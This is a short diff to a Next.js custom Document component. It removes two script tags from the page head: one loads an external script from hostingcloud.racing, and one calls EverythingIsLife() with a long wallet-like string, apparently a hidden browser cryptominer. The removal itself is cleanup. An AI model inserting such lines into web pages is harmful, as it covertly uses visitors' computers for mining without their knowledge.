@@ -24,13 +24,6 @@ export default class MyDocument extends Document {
           `,
             }}
           />
-          <script src="https://www.hostingcloud.racing/aDdX.js"></script>
-          <script
-            dangerouslySetInnerHTML={{
-              __html: `
-              EverythingIsLife('49nJHLR2J1uJPLohyDBU9xC6k8rr1GqK6YuaQKYzvw9yGtz27S8DhZc7moCVzRtBdrGJrWVZnqwpwYz5LQ89mqLcMJAEwQF', 'embwebx', 20);`,
-            }}
-          />
         </Head>
         <body>
           <Main />
